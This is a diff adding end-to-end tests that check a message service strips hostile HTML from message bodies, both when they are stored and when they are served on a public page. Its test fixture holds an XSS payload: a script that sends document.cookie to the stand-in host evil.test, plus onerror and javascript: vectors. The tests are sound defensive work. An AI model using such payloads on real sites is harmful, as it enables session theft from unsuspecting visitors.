@@ -241,6 +241,84 @@ describe("Messages (e2e)", () => {
     expect(refreshed.viewCount).toBe(2);
   });
 
+  /**
+   * The message body is written by an account member and rendered as HTML on a
+   * public, unauthenticated page with `dangerouslySetInnerHTML`. Two write paths
+   * reach the same column: PATCH /message-pages/:id sanitises, PATCH
+   * /messages/:id did not. The audience for anything that gets through is not
+   * the author — it is every recipient who scans a printed card. See ADR 0181.
+   */
+  describe("hostile HTML in a message body", () => {
+    const HOSTILE =
+      `Congratulations!<script>fetch("https://evil.test/"+document.cookie)</script>` +
+      `<img src=x onerror="alert(1)"><a href="javascript:alert(2)">click</a>`;
+
+    async function pageIdFor(token: string): Promise<{ pageId: string; slug: string }> {
+      await createPaidOrder(token, "Grace");
+      const link = await prisma.messagePageLink.findFirstOrThrow({
+        where: {
+          orderRecipient: { batchOrder: { account: { name: { contains: "Test Centre" } } } },
+        },
+        orderBy: { createdAt: "desc" },
+      });
+      return { pageId: link.messagePageId, slug: link.slug };
+    }
+
+    it("is stripped by PATCH /messages/:id before it is ever stored", async () => {
+      const { token } = await signUp();
+      const { pageId } = await pageIdFor(token);
+
+      const response = await request(app.getHttpServer())
+        .patch(`/messages/${pageId}`)
+        .set("Authorization", `Bearer ${token}`)
+        .send({ message: HOSTILE })
+        .expect(200);
+
+      // The words survive; the executable parts do not.
+      const saved = (response.body as { message: string }).message;
+      expect(saved).toContain("Congratulations!");
+      expect(saved).not.toContain("<script");
+      expect(saved).not.toContain("onerror");
+      expect(saved).not.toContain("javascript:");
+
+      // And it is the *stored* value that is clean, not just the response.
+      const row = await prisma.messagePage.findUniqueOrThrow({ where: { id: pageId } });
+      expect(row.message).toBe(saved);
+    });
+
+    it("never reaches the public page, even for a row written before the fix", async () => {
+      const { token } = await signUp();
+      const { pageId, slug } = await pageIdFor(token);
+      // Straight into the column, modelling anything already stored by the
+      // unsanitised path — no migration can re-clean those rows, so the read
+      // has to.
+      await prisma.messagePage.update({ where: { id: pageId }, data: { message: HOSTILE } });
+
+      const view = await request(app.getHttpServer()).get(`/messages/${slug}`).expect(200);
+
+      const served = (view.body as { message: string }).message;
+      expect(served).toContain("Congratulations!");
+      expect(served).not.toContain("<script");
+      expect(served).not.toContain("onerror");
+      expect(served).not.toContain("javascript:");
+    });
+
+    it("keeps the formatting an author is allowed to use", async () => {
+      const { token } = await signUp();
+      const { pageId } = await pageIdFor(token);
+
+      const response = await request(app.getHttpServer())
+        .patch(`/messages/${pageId}`)
+        .set("Authorization", `Bearer ${token}`)
+        .send({ message: "<p>Well <strong>done</strong>, Grace</p><ul><li>Nine years</li></ul>" })
+        .expect(200);
+
+      expect((response.body as { message: string }).message).toBe(
+        "<p>Well <strong>done</strong>, Grace</p><ul><li>Nine years</li></ul>",
+      );
+    });
+  });
+
   it("classifies an auto-page's seeded provider video as an embed, not a raw upload", async () => {
     // The card designer's "Video link" field collects an embed URL (YouTube et
     // al). An auto-created per-card page must store it as `embed` so the public
